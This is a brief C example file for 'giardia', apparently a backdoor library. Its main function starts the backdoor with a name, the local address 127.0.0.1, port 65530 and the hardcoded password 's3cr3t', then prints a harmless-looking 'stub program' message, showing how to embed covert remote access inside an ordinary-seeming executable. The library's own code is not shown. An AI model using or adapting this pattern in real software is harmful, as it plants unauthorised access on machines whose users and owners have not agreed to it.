/*
 * example.c
 * Example usage of giardia
 * By J. Stuart McMurray
 * Created 20170720
 * Last Modified 20170722
 */

#include <stdio.h>
#include <unistd.h>
#include "giardia.h"

int main(int argc, char **argv) {
        /* Start the backdoor */
        giardia_start(&(argv[0]), "foo", "127.0.0.1", 65530, "s3cr3t", 1);

        printf("This is a stub program, pid %i.\n", getpid());
        return 0;
}
